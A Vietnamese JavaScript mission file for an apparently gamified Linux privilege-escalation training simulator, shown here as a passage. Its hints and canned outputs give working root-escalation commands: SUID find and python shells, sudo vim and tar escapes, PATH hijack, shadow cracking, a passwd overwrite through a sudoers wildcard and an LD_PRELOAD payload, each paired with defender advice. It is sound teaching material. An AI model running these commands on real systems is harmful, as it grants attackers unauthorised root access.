// Mission MỚI (bổ sung) cho Chương 7 — Privilege Escalation. Bám OSCP PEN-200 / PNPT + GTFOBins.
// Engine offline: lệnh file-based (cat/ls/find/echo) KHÔNG có output khi đọc filesystem thật (engine tự sinh);
// lệnh tool/giả lập (sudo -l, uname -a, getcap, id, exploit canned) PHẢI có output đóng hộp.
import fsC7M4 from '../filesystems/chapter7-mission4.js';
import fsC7M5 from '../filesystems/chapter7-mission5.js';
import fsC7M6 from '../filesystems/chapter7-mission6.js';
import fsC7M7 from '../filesystems/chapter7-mission7.js';
import fsC7M8 from '../filesystems/chapter7-mission8.js';
import fsC7M9 from '../filesystems/chapter7-mission9.js';
import fsC7M10 from '../filesystems/chapter7-mission10.js';
import fsC7M11 from '../filesystems/chapter7-mission11.js';
import fsC7M12 from '../filesystems/chapter7-mission12.js';
import fsC7M13 from '../filesystems/chapter7-mission13.js';
import fsC7M14 from '../filesystems/chapter7-mission14.js';
import fsC7M15 from '../filesystems/chapter7-mission15.js';
import fsC7M16 from '../filesystems/chapter7-mission16.js';
import fsC7M17 from '../filesystems/chapter7-mission17.js';
import fsC7M18 from '../filesystems/chapter7-mission18.js';

export default [
  {
    id: 4,
    chapterId: 7,
    title: 'Bộ enum khởi động',
    story:
      'Mày vừa có shell user thường trên một máy lạ. Trước khi mò mẫm exploit, mọi pentester chuyên nghiệp đều chạy đúng 4 lệnh enum đầu tiên: mày là ai, sudo được gì, kernel nào, và có user nào bất thường trong /etc/passwd.',
    steps: [
      {
        id: 'id',
        description: 'Xem mày đang là user nào, thuộc group nào',
        match: /^id\s*$/,
        output: 'uid=1000(hacker) gid=1000(hacker) groups=1000(hacker),4(adm)',
      },
      {
        id: 'sudo_l',
        description: 'Kiểm tra mày được sudo chạy gì (nếu có)',
        match: /^sudo\s+-l/,
        output: [
          'Matching Defaults entries for hacker:',
          '    env_reset, secure_path=/usr/sbin:/usr/bin:/sbin:/bin',
          '',
          'User hacker may run the following commands on this host:',
          '    (ALL) ALL',
          '# <- sai, đây chỉ là placeholder enum, không tồn tại NOPASSWD nào ở bài này',
        ].join('\n'),
      },
      {
        id: 'uname',
        description: 'Xem kernel version và kiến trúc hệ thống',
        match: /^uname\s+-a/,
        output: 'Linux acmebox 5.4.0-99-generic #112-Ubuntu SMP x86_64 GNU/Linux',
      },
      {
        id: 'cat_passwd',
        description: 'Đọc /etc/passwd để tìm user có shell bất thường',
        match: /^cat\s+\/etc\/passwd/,
      },
    ],
    hints: [
      'Bốn câu hỏi đầu tiên khi vào một máy lạ: mình là ai, sudo được gì, kernel nào, ai khác đang sống ở đây.',
      'Dùng `id`, `sudo -l`, `uname -a` lần lượt — mỗi lệnh trả lời một câu hỏi.',
      'Gõ `cat /etc/passwd` và soi kỹ — user `jenkins` có shell `/bin/bash` trong khi service account bình thường phải là `/usr/sbin/nologin`, đó là dấu hiệu đáng điều tra tiếp.',
    ],
    debrief: [
      'Enum không phải bước phụ — nó là nền tảng của privesc: mọi kỹ thuật ở các bài sau (SUID, sudo, cron, capabilities) đều bắt đầu từ 4 lệnh này.',
      '`id` cho biết uid/gid và các group phụ — group như `docker`, `disk`, `adm` đôi khi tương đương root mà không cần exploit gì cả.',
      'Service account có shell hợp lệ (`/bin/bash` thay vì `/usr/sbin/nologin`) là dấu hiệu admin cấu hình lỏng — tài khoản đó có thể có mật khẩu yếu hoặc bị quên khoá.',
      'DEFENDER: service account luôn đặt shell `/usr/sbin/nologin`; hạn chế group phụ không cần thiết; `sudo -l` của user thường nên trống hoặc tối thiểu — mọi dòng NOPASSWD/ALL là một rủi ro cần review.',
    ],
    terms: [
      { term: 'id', def: 'Lệnh hiện uid, gid và các group phụ của user hiện tại.' },
      { term: 'sudo -l', def: 'Liệt kê các lệnh user hiện tại được phép chạy bằng sudo.' },
      { term: 'uname -a', def: 'Hiện thông tin kernel, hostname, kiến trúc của hệ thống.' },
      { term: 'enum (enumeration)', def: 'Bước thu thập thông tin hệ thống có hệ thống trước khi tìm đường leo quyền.' },
    ],
    initialFilesystem: fsC7M4,
  },
  {
    id: 5,
    chapterId: 7,
    title: 'Săn SUID giữa đám đông',
    story:
      'Enum xong, giờ tới bước kinh điển nhất của privesc Linux: liệt kê mọi binary mang SUID bit. Hầu hết là bình thường (sudo, passwd, mount) — nhưng có một thằng lạc loài không nên có quyền đó.',
    steps: [
      {
        id: 'find_suid',
        description: 'Liệt kê toàn bộ binary có SUID bit (-perm -4000)',
        match: /^find\s+\/.*-perm\s+-4000/,
        output: ['/usr/bin/sudo', '/usr/bin/passwd', '/usr/bin/mount', '/usr/bin/find'].join('\n'),
      },
      {
        id: 'gtfobins',
        description: 'Khai thác binary lạ (find) qua GTFOBins để có shell root',
        match: /find\b.*-exec\s+\/bin\/sh/,
        output: '# id\nuid=0(root) gid=0(root) groups=0(root)   <- root shell via SUID find -exec (GTFOBins)',
      },
      { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Trong list SUID, hầu hết binary là bình thường (sudo, passwd, mount). Tìm cái không thuộc nhóm đó.',
      'Dùng `find / -perm -4000 2>/dev/null` — chú ý `/usr/bin/find` xuất hiện, đây không nên có SUID.',
      'Tra GTFOBins cho find: `find . -exec /bin/sh -p \\; -quit` để có shell root, rồi `cat /root/flag.txt`.',
    ],
    debrief: [
      'SUID bit (4000 trong octal) cho phép một binary chạy với uid của OWNER (thường root) bất kể ai gọi nó — thiết kế hợp lý cho `passwd` (cần sửa /etc/shadow) nhưng nguy hiểm nếu gắn nhầm vào binary đa năng.',
      'GTFOBins.github.io liệt kê chính xác cách mỗi binary phổ biến (find, vim, less, python, awk...) có thể bị lợi dụng để escape shell hoặc đọc/ghi file khi có SUID, sudo, hoặc capability.',
      'Vì sao `find -exec` hoạt động: cờ `-exec` chạy lệnh con vẫn giữ effective uid của process find (root) — `/bin/sh -p` giữ nguyên privilege thay vì hạ về uid thật.',
      'DEFENDER: audit SUID bit định kỳ (`find / -perm -4000`), gỡ SUID khỏi binary không cần thiết (`chmod -s`); danh sách SUID hợp lệ nên cố định và được giám sát thay đổi.',
    ],
    terms: [
      { term: 'SUID bit (4000)', def: 'Cờ khiến binary chạy với quyền của owner (thường root) bất kể ai gọi.' },
      { term: 'find -perm -4000', def: 'Tìm mọi file có SUID bit được set trên toàn hệ thống.' },
      { term: 'GTFOBins', def: 'Kho tra cứu cách lạm dụng binary hợp lệ (SUID/sudo/capability) để escape hoặc leo quyền.' },
      { term: 'effective uid', def: 'UID thực tế process dùng để kiểm tra quyền khi thực thi — khác với uid thật khi có SUID.' },
    ],
    initialFilesystem: fsC7M5,
  },
  {
    id: 6,
    chapterId: 7,
    title: 'Sudo hào phóng quá mức',
    story:
      'SUID list lần này sạch. Nhưng `sudo -l` lại tiết lộ điều khác: ai đó cho phép mày chạy `vim` và `tar` bằng quyền root mà không cần mật khẩu. Một editor hay archiver tưởng vô hại luôn có cửa thoát ra shell.',
    steps: [
      {
        id: 'sudo_l',
        description: 'Kiểm tra sudo -l để xem lệnh nào chạy được bằng root không cần password',
        match: /^sudo\s+-l/,
        output: [
          'Matching Defaults entries for hacker:',
          '    env_reset, secure_path=/usr/sbin:/usr/bin:/sbin:/bin',
          '',
          'User hacker may run the following commands on this host:',
          '    (root) NOPASSWD: /usr/bin/vim, /usr/bin/tar',
        ].join('\n'),
      },
      {
        id: 'escape',
        description: 'Escape ra shell root từ vim hoặc tar (GTFOBins)',
        match: /sudo\s+vim.*:!\/bin\/sh|sudo\s+tar.*--checkpoint|:!\/bin\/(sh|bash)/,
        output: '# id\nuid=0(root) gid=0(root)   <- root shell qua sudo vim (:!/bin/sh) hoặc sudo tar --checkpoint-action',
      },
      { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'sudo -l hào phóng cho 2 binary khá quen — cả hai đều có entry trên GTFOBins.',
      'Dùng `sudo -l` để xác nhận `vim` và `tar` đều NOPASSWD bằng root.',
      'Gõ `sudo vim -c \':!/bin/sh\'` để spawn shell root ngay từ vim, rồi `cat /root/flag.txt`.',
    ],
    debrief: [
      'Sudo misconfiguration là nguyên nhân privesc phổ biến nhất trong thực chiến — không phải vì binary có lỗi, mà vì ADMIN cho phép chạy nó bằng root mà quên rằng binary đó có chức năng "shell out".',
      'Editor (vim, nano, less qua `!cmd`) và archiver (tar qua `--checkpoint-action=exec=`) đều có cách hợp lệ để chạy lệnh hệ thống từ bên trong — đó là tính năng, không phải bug, nhưng nguy hiểm khi chạy bằng root.',
      'NOPASSWD nghĩa là không cần xác thực lại — kết hợp với một binary có "shell escape" trên GTFOBins là công thức root tức thì, không cần biết password thật của ai.',
      'DEFENDER: áp dụng nguyên tắc least-privilege cho sudoers — chỉ cho phép đúng SUBCOMMAND cần thiết (vd `vim -R` readonly), tránh NOPASSWD cho binary đa năng; review GTFOBins trước khi viết bất kỳ dòng sudoers nào.',
    ],
    terms: [
      { term: 'sudo NOPASSWD', def: 'Cấu hình cho phép chạy lệnh bằng sudo mà không cần nhập lại mật khẩu.' },
      { term: 'shell escape', def: 'Khả năng một chương trình (editor, pager) spawn ra shell hệ thống từ bên trong nó.' },
      { term: 'tar --checkpoint-action', def: 'Cờ tar cho phép chạy lệnh tuỳ ý tại mỗi checkpoint — bị lạm dụng để chạy shell.' },
      { term: 'least privilege', def: 'Nguyên tắc chỉ cấp đúng quyền tối thiểu cần thiết, không hơn.' },
    ],
    initialFilesystem: fsC7M6,
  },
  {
    id: 7,
    chapterId: 7,
    title: 'Cướp đường PATH của root',
    story:
      'Không có sudo hớ hênh, không SUID lạ. Nhưng có một script trong /opt được root chạy định kỳ — và nó gọi `tar` bằng tên trần, không full path. Đây là PATH hijack: mày tự tạo một `tar` giả và để root tự chạy nó.',
    steps: [
      { id: 'read_script', description: 'Đọc script root chạy để tìm lệnh gọi bằng tên trần', match: /^cat\s+\/opt\/backup\.sh/ },
      {
        id: 'fake_tar',
        description: 'Tạo binary tar giả trong /tmp, gắn execute bit',
        match: /(echo|printf).*\/tmp\/tar|chmod\s+\+x\s+\/tmp\/tar/,
        output: '(đã tạo /tmp/tar chứa payload: cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash)',
      },
      {
        id: 'export_path',
        description: 'Đặt /tmp lên đầu PATH để shell ưu tiên tìm tar ở đó trước',
        match: /^export\s+PATH=\/tmp:?\$PATH/,
        output: '(PATH giờ là /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin)',
      },
      {
        id: 'wait_cron',
        description: 'Đợi cron của root chạy script và thực thi tar giả',
        match: /(sleep|wait|crontab\s+-l)/,
        output: '[5 phút sau] cron root chạy /opt/backup.sh -> gọi "tar" -> shell tìm thấy /tmp/tar trước -> payload chạy bằng quyền root -> /tmp/rootbash giờ có SUID',
      },
      { id: 'root_shell', description: 'Chạy rootbash với -p để giữ effective uid root', match: /\/tmp\/rootbash\s+-p/, output: '# id\nuid=1000(hacker) euid=0(root)   <- root shell via PATH hijack' },
      { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Một script được root chạy tự động đang gọi lệnh hệ thống bằng tên trần, không phải đường dẫn đầy đủ.',
      'Đọc `cat /opt/backup.sh` — nó gọi `tar` không có `/bin/` hay `/usr/bin/` phía trước. Tạo binary giả: `echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /tmp/tar` rồi `chmod +x /tmp/tar`.',
      '`export PATH=/tmp:$PATH` rồi đợi cron chạy: `crontab -l` xác nhận lịch, hoặc đơn giản `sleep 300` để chờ. Khi root thực thi script, shell tra PATH theo thứ tự và tìm /tmp/tar TRƯỚC /usr/bin/tar thật. Sau khi có /tmp/rootbash SUID, chạy `/tmp/rootbash -p` rồi `cat /root/flag.txt`.',
    ],
    debrief: [
      'PATH là danh sách thư mục shell tra theo THỨ TỰ để tìm binary khi gọi bằng tên trần — thư mục nào đứng trước được ưu tiên, dù ai đặt nó vào PATH cũng có quyền chi phối lệnh nào thực sự chạy.',
      'Script chạy bằng root mà gọi lệnh không full-path (`tar` thay vì `/bin/tar`) là lỗi viết script kinh điển — biến PATH của TIẾN TRÌNH CHẠY SCRIPT (không phải PATH của attacker) thành điểm yếu.',
      '`-p` khi chạy bash kế thừa từ SUID binary giữ nguyên effective uid (root) thay vì bash tự hạ quyền về uid thật khi phát hiện chạy với SUID — chi tiết nhỏ nhưng quyết định có lấy được shell root hay không.',
      'DEFENDER: luôn gọi binary bằng full path trong script chạy với quyền cao (`/usr/bin/tar` không phải `tar`); đặt `PATH` cố định đầu script (`PATH=/usr/bin:/bin`); không bao giờ để thư mục world-writable (như /tmp) nằm trước trong PATH của root.',
    ],
    terms: [
      { term: 'PATH hijack', def: 'Lợi dụng thứ tự tìm binary trong biến PATH để đánh lừa một process chạy binary giả của attacker.' },
      { term: 'binary giả (PATH)', def: 'Script/binary tự tạo, đặt tên trùng lệnh hệ thống, đặt trong thư mục đứng trước trong PATH.' },
      { term: 'full path call', def: 'Gọi lệnh bằng đường dẫn đầy đủ (/bin/tar) thay vì tên trần (tar) — an toàn hơn trong script chạy quyền cao.' },
      { term: 'bash -p', def: 'Cờ giữ nguyên effective uid kế thừa từ SUID, không tự hạ quyền về uid thật.' },
    ],
    initialFilesystem: fsC7M7,
  },
  {
    id: 8,
    chapterId: 7,
    title: 'Bẻ khoá /etc/shadow',
    story:
      'Một lỗi cấu hình hiếm nhưng chí mạng: mày đọc được /etc/shadow trực tiếp. Bên trong là hash mật khẩu của mọi user, kể cả root. Giờ là lúc gộp passwd+shadow và chạy crack offline.',
    steps: [
      { id: 'cat_shadow', description: 'Đọc /etc/shadow — đáng ra chỉ root mới đọc được', match: /^cat\s+\/etc\/shadow/ },
      {
        id: 'unshadow',
        description: 'Gộp /etc/passwd và /etc/shadow thành format crack được (unshadow)',
        match: /^unshadow\s+\/etc\/passwd\s+\/etc\/shadow/,
        output: 'root:$6$xyzsalt$3kHq9LpVbN2cR7tWmZ0fJ1dGsP8aQeU5oI4yX6vL.lab.demo.hash.only:0:0:root:/root:/bin/bash\nsvc:$6$abcsalt$Wk2mN9pQ7rT4vY1xZ3cB8dF5gH0jK6lM.lab.weakpass.password123.demo:1001:1001:Service:/home/svc:/bin/bash\n  > saved to crack.txt',
      },
      {
        id: 'john_run',
        description: 'Crack hash bằng john với wordlist',
        match: /^john\s+.*(crack\.txt|--wordlist)/,
        output: [
          'Using default input encoding: UTF-8',
          'Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])',
          'password123      (svc)',
          '1g 0:00:00:04 DONE (2026-06-26 10:02) 0.2380g/s 512p/s 512c/s 512C/s',
          'Use the "--show" option to display all of the cracked passwords reliably',
        ].join('\n'),
      },
      { id: 'su_svc', description: 'Đăng nhập bằng tài khoản svc vừa crack được', match: /^su\s+svc/, output: 'Password: password123\n$ id\nuid=1001(svc) gid=1001(svc) groups=1001(svc)' },
    ],
    hints: [
      'Đọc được /etc/shadow là jackpot — nó chứa hash, không phải password trần, nên còn một bước crack offline nữa.',
      'Dùng `cat /etc/shadow` để xác nhận đọc được, rồi `unshadow /etc/passwd /etc/shadow > crack.txt` để gộp 2 file thành format john hiểu.',
      'Chạy `john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt` — tài khoản `svc` sẽ crack ra `password123` trong vài giây vì đó là mật khẩu yếu kinh điển. Đăng nhập bằng `su svc` (password `password123`).',
    ],
    debrief: [
      '/etc/passwd chứa thông tin user (uid, shell, home) công khai cho mọi tiến trình đọc; /etc/shadow chứa HASH mật khẩu và chỉ root đọc được — đọc được file này nghĩa là kiểm soát truy cập đã bị bypass ở đâu đó.',
      '`$6$` là tiền tố SHA-512 crypt — một thuật toán hash chậm có chủ đích (cùng với salt riêng từng user) để chống brute-force, nhưng KHÔNG chống được password yếu/phổ biến như password123.',
      'john (hoặc hashcat) thử từng từ trong wordlist, hash nó với đúng thuật toán+salt rồi so khớp — đây gọi là offline cracking, khác hẳn online brute-force vì không bị rate-limit hay lockout của server.',
      'DEFENDER: /etc/shadow phải có permission 600 chỉ root đọc (`-rw-------`); enforce password policy đủ mạnh để chống dictionary attack; cân nhắc thuật toán hash chậm hơn nữa (bcrypt/argon2) cho hệ thống mới; audit định kỳ ai đọc được file nhạy cảm.',
    ],
    terms: [
      { term: '/etc/shadow', def: 'File chứa hash mật khẩu của mọi user, chỉ root đọc được trong cấu hình đúng.' },
      { term: 'unshadow', def: 'Công cụ gộp /etc/passwd và /etc/shadow thành 1 file format john hiểu được.' },
      { term: 'john / hashcat', def: 'Công cụ crack hash offline bằng wordlist hoặc brute-force, có hỗ trợ GPU.' },
      { term: 'offline cracking', def: 'Crack hash đã lấy được trên máy attacker, không giới hạn số lần thử như đăng nhập online.' },
    ],
    initialFilesystem: fsC7M8,
  },
  {
    id: 9,
    chapterId: 7,
    title: 'Kernel cũ, capability hớ hênh',
    story:
      'SUID sạch, sudo sạch, shadow không đọc được. Hai con đường cuối: kernel có lỗ hổng public không, và có binary nào mang capability đặc biệt mà `find -perm` không bắt được.',
    steps: [
      { id: 'uname_r', description: 'Lấy đúng version kernel để tra CVE', match: /^uname\s+-r/, output: '5.4.0-99-generic' },
      {
        id: 'searchsploit',
        description: 'Tra exploit công khai khớp với kernel version (searchsploit)',
        match: /^searchsploit\s+.*5\.4/,
        output: [
          '------------------------------------------------------- ---------------------------------',
          ' Exploit Title                                          |  Path',
          '------------------------------------------------------- ---------------------------------',
          'Ubuntu 5.4.0 - \'overlayfs\' Local Privilege Escalation   | linux/local/extra_overlayfs.rb',
          '------------------------------------------------------- ---------------------------------',
        ].join('\n'),
      },
      {
        id: 'getcap',
        description: 'Quét toàn hệ thống tìm capability bất thường (getcap -r /)',
        match: /^getcap\s+-r\s+\//,
        output: ['/usr/bin/python3.9 = cap_setuid+ep'].join('\n'),
      },
      {
        id: 'exploit_cap',
        description: 'Khai thác cap_setuid trên python3 để spawn shell root (GTFOBins)',
        match: /python3.*os\.setuid\(0\)|import\s+os.*setuid/,
        output: '$ python3.9 -c \'import os; os.setuid(0); os.system("/bin/bash")\'\n# id\nuid=0(root) gid=1000(hacker)   <- root via cap_setuid capability',
      },
      { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Hai hướng còn lại: kernel cũ có CVE public không, và có capability lạ nào nằm ngoài SUID bit.',
      'Dùng `uname -r` rồi `searchsploit linux kernel 5.4` để tra exploit; song song chạy `getcap -r /` — khác `find -perm -4000`, lệnh này bắt capability.',
      '`getcap` báo `python3.9 = cap_setuid+ep`. Khai thác: `python3.9 -c \'import os; os.setuid(0); os.system("/bin/bash")\'` rồi `cat /root/flag.txt`.',
    ],
    debrief: [
      'Linux capabilities chia nhỏ quyền root thành từng đơn vị (cap_setuid, cap_net_raw, cap_sys_admin...) — một binary có thể có ĐÚNG MỘT capability mạnh (như đổi uid) mà không cần toàn bộ SUID bit, nên `find -perm -4000` không bắt được nó.',
      '`getcap -r /` quét đệ quy toàn hệ thống tìm file mang extended attribute capability — đây là bước enum bị bỏ sót nhiều nhất vì hầu hết người mới chỉ nhớ check SUID.',
      'Kernel exploit (như overlayfs CVE) là con đường cuối khi mọi misconfiguration đã sạch — nhưng rủi ro cao hơn (có thể crash máy) nên luôn ưu tiên thử SUID/sudo/capability/cron trước.',
      'DEFENDER: patch kernel định kỳ để vá CVE đã công khai; audit capability bằng `getcap -r /` song song với audit SUID — đừng chỉ nhìn một loại cờ quyền và nghĩ là đã enum đủ.',
    ],
    terms: [
      { term: 'Linux capabilities', def: 'Cơ chế chia nhỏ quyền root thành từng đơn vị (cap_setuid, cap_sys_admin...) gắn vào binary.' },
      { term: 'getcap -r /', def: 'Quét đệ quy hệ thống tìm file có gắn capability đặc biệt.' },
      { term: 'cap_setuid', def: 'Capability cho phép process đổi uid của chính nó — tương đương SUID root nếu lạm dụng được.' },
      { term: 'kernel exploit', def: 'Khai thác lỗ hổng trong chính kernel (qua CVE công khai) để leo quyền, rủi ro cao hơn misconfiguration.' },
    ],
    initialFilesystem: fsC7M9,
  },
  {
    id: 10,
    chapterId: 7,
    title: 'Wildcard chết người trong sudoers',
    story:
      'sudo -l cho mày chạy `cp` từ thư mục backup bằng root — tưởng vô hại để restore file. Nhưng dòng sudoers có dấu `*` ở cuối, và wildcard sau sudo luôn là một cái bẫy: mày tự chọn được đích ghi.',
    steps: [
      {
        id: 'sudo_l',
        description: 'Xem chính xác dòng sudoers cho phép chạy cp với wildcard',
        match: /^sudo\s+-l/,
        output: [
          'Matching Defaults entries for hacker:',
          '    env_reset, secure_path=/usr/sbin:/usr/bin:/sbin:/bin',
          '',
          'User hacker may run the following commands on this host:',
          '    (root) NOPASSWD: /bin/cp /var/backups/* *',
        ].join('\n'),
      },
      { id: 'cat_passwd', description: 'Đọc /etc/passwd hiện tại trước khi sửa', match: /^cat\s+\/etc\/passwd/ },
      {
        id: 'make_payload',
        description: 'Tạo file passwd giả chứa thêm user uid 0 không cần password',
        match: /(echo|printf).*\/var\/backups\/.*passwd|>\s*\/var\/backups\/\S*passwd/,
        output: '(đã tạo /var/backups/passwd chứa thêm dòng "pwned::0:0::/root:/bin/bash" — user uid 0, không password)',
      },
      {
        id: 'sudo_cp',
        description: 'Dùng sudo cp với wildcard để ghi đè /etc/passwd thật',
        match: /^sudo\s+cp\s+\/var\/backups\/\S*passwd\s+\/etc\/passwd/,
        output: '(đã copy bằng quyền root — /etc/passwd thật giờ có thêm user "pwned" uid 0)',
      },
      { id: 'su_pwned', description: 'Đăng nhập bằng user mới tạo, không cần mật khẩu', match: /^su\s+pwned/, output: '# id\nuid=0(pwned) gid=0(root)   <- root via sudoers wildcard cp overwrite' },
      { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Chạy `sudo -l` — nó cho phép `cp` với dấu `*` ở CUỐI lệnh — dấu hoa thị đó nghĩa là đích copy do MÀY chọn, không bị giới hạn.',
      'Gõ `cat /etc/passwd` để biết format dòng hiện tại, rồi tạo một file passwd giả trong /var/backups (thư mục được phép làm nguồn): `echo "pwned::0:0::/root:/bin/bash" > /var/backups/passwd`.',
      'Chạy `sudo cp /var/backups/passwd /etc/passwd` để ghi đè bằng quyền root, rồi `su pwned` (không cần password vì field hash rỗng) và `cat /root/flag.txt`.',
    ],
    debrief: [
      'Wildcard (`*`) trong sudoers áp dụng cho TOÀN BỘ phần còn lại của lệnh — `/bin/cp /var/backups/* *` không chỉ giới hạn nguồn, dấu `*` thứ hai cho phép chọn ĐÍCH bất kỳ, biến một quyền tưởng hẹp thành ghi-file-tuỳ-ý.',
      'Trong /etc/passwd, nếu field password (thứ 2, sau dấu `:`) để RỖNG, hệ thống coi user đó KHÔNG CÓ password — `su user` sẽ vào ngay không hỏi gì; đây là kỹ thuật privesc cổ điển khi ghi được /etc/passwd.',
      'sudoers wildcard không chỉ nguy hiểm với `cp` — bất kỳ binary nào cho phép wildcard ở vị trí có thể bị lợi dụng (đường dẫn, tên file, argument) đều cần soi kỹ; GTFOBins có mục riêng "Sudo" cho từng binary.',
      'DEFENDER: KHÔNG BAO GIỜ dùng wildcard ở cuối dòng sudoers cho lệnh có thể đổi đích (cp, mv, tee); nếu cần restore file, chỉ định path/tên file CỤ THỂ; audit /etc/sudoers.d định kỳ tìm dấu `*` đáng ngờ.',
    ],
    terms: [
      { term: 'sudoers wildcard', def: 'Dấu * trong dòng sudoers cho phép khớp nhiều giá trị — nguy hiểm khi nằm ở vị trí kiểm soát đích ghi.' },
      { term: 'password field rỗng', def: 'Trong /etc/passwd, field thứ 2 rỗng (sau khi tách bằng :) nghĩa là user không cần password để đăng nhập.' },
      { term: 'GTFOBins (Sudo)', def: 'Mục riêng trên GTFOBins liệt kê cách lạm dụng từng binary khi được cấp quyền chạy qua sudo.' },
      { term: 'arbitrary file write', def: 'Khả năng ghi nội dung tuỳ ý vào một file bất kỳ trên hệ thống — thường dẫn thẳng tới privesc.' },
    ],
    initialFilesystem: fsC7M10,
  },
  {
    id: 11,
    chapterId: 7,
    title: 'SUID trên ngôn ngữ scripting',
    story:
      'Lần trước là `find`. Lần này mày soi lại toàn bộ danh sách SUID và thấy một thứ còn nguy hiểm hơn nhiều: một interpreter ngôn ngữ scripting đầy đủ mang SUID bit. Với Python, mày không cần GTFOBins thuộc lòng — chỉ cần biết `os.setuid`.',
    steps: [
      {
        id: 'find_suid',
        description: 'Liệt kê lại toàn bộ binary SUID trên hệ thống này',
        match: /^find\s+\/.*-perm\s+-4000/,
        output: ['/usr/bin/sudo', '/usr/bin/passwd', '/usr/bin/su', '/usr/bin/python3'].join('\n'),
      },
      {
        id: 'exploit_python',
        description: 'Spawn shell root bằng cách gọi os.setuid(0) trong python3',
        match: /python3.*os\.setuid\(0\)/,
        output: '$ python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'\n# id\nuid=0(root) gid=0(root)   <- root via SUID python3 (GTFOBins os.setuid)',
      },
      { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'So với danh sách SUID bình thường, một thứ ở đây không nên có quyền chạy-như-root: một interpreter ngôn ngữ.',
      'Dùng `find / -perm -4000 2>/dev/null` — `/usr/bin/python3` xuất hiện, đây là SUID python3.',
      'GTFOBins cho python3 (SUID): `python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'` rồi `cat /root/flag.txt`.',
    ],
    debrief: [
      'Một interpreter ngôn ngữ (python, perl, ruby, lua) mang SUID nguy hiểm hơn một binary đơn năng vì nó có TOÀN BỘ stdlib — `os.setuid(0)` là một lời gọi system call trực tiếp, không cần tìm cách "escape" gì cả.',
      '`os.setuid(0)` thành công vì process python3 đang chạy với SUID (effective uid = root từ owner của binary) — gọi setuid bên trong process đó hợp lệ vì process đã có quyền root để bắt đầu.',
      'Sự khác biệt với mission trước (`find`): `find -exec` cần một bước escape gián tiếp qua tham số `-exec`, còn interpreter SUID cho phép viết code TRỰC TIẾP gọi syscall — bề mặt tấn công rộng hơn nhiều.',
      'DEFENDER: KHÔNG BAO GIỜ gắn SUID cho một interpreter ngôn ngữ đầy đủ (python, perl, php-cli, ruby) — nếu cần chạy script với quyền cao, dùng wrapper hẹp (vd một script C compile riêng) thay vì SUID cả interpreter.',
    ],
    terms: [
      { term: 'interpreter SUID', def: 'Trình dịch ngôn ngữ (python/perl/ruby) mang SUID bit — nguy hiểm vì có toàn bộ stdlib để gọi syscall.' },
      { term: 'os.setuid(0)', def: 'Lời gọi Python đổi uid của tiến trình hiện tại về 0 (root), hợp lệ khi process đang có quyền root.' },
      { term: 'syscall trực tiếp', def: 'Gọi system call ngay trong code, không cần escape qua cờ -exec hay shell-out gián tiếp.' },
      { term: 'wrapper hẹp', def: 'Binary nhỏ, biên dịch riêng, chỉ làm đúng 1 việc — an toàn hơn SUID nguyên cả interpreter.' },
    ],
    initialFilesystem: fsC7M11,
  },
  {
    id: 12,
    chapterId: 7,
    title: 'LD_PRELOAD lẻn vào sudo',
    story:
      '`sudo -l` lần này không có gì đáng ngờ về BINARY — nhưng có một dòng `Defaults` lạ ở trên cùng: `env_keep += "LD_PRELOAD"`. Đây không phải lỗi của lệnh được phép chạy, mà lỗi của MÔI TRƯỜNG được giữ lại khi sudo thực thi.',
    steps: [
      {
        id: 'sudo_l',
        description: 'Đọc kỹ sudo -l, chú ý dòng Defaults env_keep',
        match: /^sudo\s+-l/,
        output: [
          'Matching Defaults entries for hacker:',
          '    env_reset, env_keep += "LD_PRELOAD", secure_path=/usr/sbin:/usr/bin:/sbin:/bin',
          '',
          'User hacker may run the following commands on this host:',
          '    (root) NOPASSWD: /usr/bin/find',
        ].join('\n'),
      },
      {
        id: 'write_payload',
        description: 'Viết file C chứa constructor gọi setuid(0)+system("/bin/bash")',
        match: /(echo|cat\s*>).*\.c\b/,
        output: '(đã viết /tmp/preload.c — chứa hàm __attribute__((constructor)) gọi setuid(0); system("/bin/bash");)',
      },
      {
        id: 'compile',
        description: 'Compile thành shared object (.so)',
        match: /^gcc\s+.*-shared.*-o\s+\S*\.so/,
        output: '(compiled /tmp/preload.so thành công, không lỗi)',
      },
      {
        id: 'run_with_preload',
        description: 'Chạy lệnh sudo được phép kèm LD_PRELOAD=preload.so',
        match: /^sudo\s+LD_PRELOAD=\S*\.so\s+\/usr\/bin\/find/,
        output: '# id\nuid=0(root) gid=0(root)   <- root shell: .so nạp TRƯỚC khi find chạy, constructor gọi setuid(0) ngay khi sudo còn giữ quyền root',
      },
      { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: [
      'Không phải binary được phép chạy có vấn đề — mà là một biến môi trường được sudo GIỮ LẠI thay vì xoá.',
      '`sudo -l` cho thấy `env_keep += "LD_PRELOAD"`. Viết file .c có hàm constructor gọi setuid+system: `echo \'void _init() { setuid(0); system("/bin/bash"); }\' > /tmp/preload.c`, rồi compile bằng `gcc -shared -fPIC -o /tmp/preload.so /tmp/preload.c`.',
      'Chạy `sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find` — `.so` được nạp và chạy code TRƯỚC khi find thực thi, trong khi sudo còn đang giữ quyền root. Sau đó `cat /root/flag.txt`.',
    ],
    debrief: [
      '`LD_PRELOAD` là biến môi trường bảo dynamic linker nạp một shared object TRƯỚC mọi thư viện khác — bình thường dùng để debug/override hàm, nhưng nếu sudo giữ lại biến này (`env_keep`), code trong .so chạy bằng quyền của lệnh sudo đang gọi.',
